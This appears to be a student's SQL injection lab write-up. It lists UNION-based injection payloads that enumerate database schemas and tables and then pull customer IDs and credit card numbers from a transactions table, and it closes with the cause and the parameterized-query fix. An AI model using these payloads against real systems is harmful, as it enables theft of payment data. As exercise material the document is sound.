# SQL injection

## Steps

**first steps to get "a" credit card number**
    - Steps: get info about metadata (schmema, table columns, and ultimatly the data with the credit card number)
    - ') UNION SELECT schema_name,1,1,1,1 FROM INFORMATION_SCHEMA.SCHEMATA #
    - ') UNION ALL SELECT table_name,1,1,1,1 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'creditcompany' #
    - ') UNION ALL SELECT customerid,cardnumber,1,1,1 FROM creditcompany.transactions #
    - > credit card number of a person: "1323-4545-6767-8989" (no info to which person this credit card no belongs)


## Answers
- Explain the security problem
    - user input is directly integrated in sql statement. (probably just some string concatenation)
- Explain your attack (exploit, screenshot, hacking journal)
- Explain mitigation (remedy)
    - use parameterized queries (prepared statements)